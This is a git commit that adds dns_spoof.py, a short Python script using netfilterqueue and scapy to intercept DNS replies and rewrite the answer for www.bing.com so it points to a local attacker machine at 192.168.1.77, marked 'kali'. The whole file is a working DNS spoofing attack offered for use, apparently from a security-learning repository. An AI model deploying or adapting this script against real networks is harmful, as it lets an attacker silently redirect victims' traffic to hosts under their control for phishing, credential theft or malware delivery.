2a2d62fa5c5375831497ce605ccebc45bc254496
N3m351d4 <42093594+n3m351d4@users.noreply.github.com>
2020-04-18 14:55:25 +0300

    Create dns_spoof.py

---
+++ dns_spoof.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python
+import netfilterqueue
+import scapy.all as scapy
+
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print ("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.77")
+            # kali
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
